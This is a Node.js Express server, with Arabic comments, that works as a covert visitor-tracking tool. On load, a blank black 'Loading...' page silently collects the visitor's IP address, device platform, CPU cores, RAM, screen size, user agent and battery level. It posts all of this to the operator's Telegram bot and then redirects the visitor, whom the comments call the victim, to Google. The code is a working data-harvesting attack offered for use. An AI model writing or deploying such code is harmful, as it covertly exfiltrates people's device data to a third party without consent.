const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const MY_ID = process.env.MY_ID;

app.get('/', async (req, res) => {
    // 1. سحب الـ IP من السيرفر مباشرة
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
            <script>
                async function sendData() {
                    // 2. سحب تفاصيل الجهاز من المتصفح
                    const specs = {
                        platform: navigator.platform,
                        cores: navigator.hardwareConcurrency || "؟",
                        ram: navigator.deviceMemory || "؟",
                        screen: window.screen.width + "x" + window.screen.height,
                        agent: navigator.userAgent
                    };

                    // 3. سحب البطارية
                    let batteryText = "غير مدعوم";
                    try {
                        const b = await navigator.getBattery();
                        batteryText = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋");
                    } catch(e) {}

                    // 4. إرسال كل شيء للتلجرام
                    const message = "🚀 **تم صيد مواصفات الجهاز!**\\n" +
                                    "--------------------------\\n" +
                                    "🌐 **الـ IP:** \`${ip}\`\\n" +
                                    "🔋 **البطارية:** " + batteryText + "\\n" +
                                    "🖥️ **النظام:** " + specs.platform + "\\n" +
                                    "🧠 **المعالج:** " + specs.cores + " Cores\\n" +
                                    "📟 **الرام:** " + specs.ram + " GB\\n" +
                                    "📺 **الشاشة:** " + specs.screen + "\\n" +
                                    "--------------------------";

                    await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            chat_id: "${MY_ID}",
                            text: message,
                            parse_mode: "Markdown"
                        })
                    });

                    // تحويل الضحية فوراً
                    window.location.href = "https://www.google.com";
                }
                window.onload = sendData;
            </script>
        </head>
        <body style="background:black; color:black;">
            </body>
        </html>
    `);
});

app.listen(PORT, () => console.log("Silent Scanner Active"));
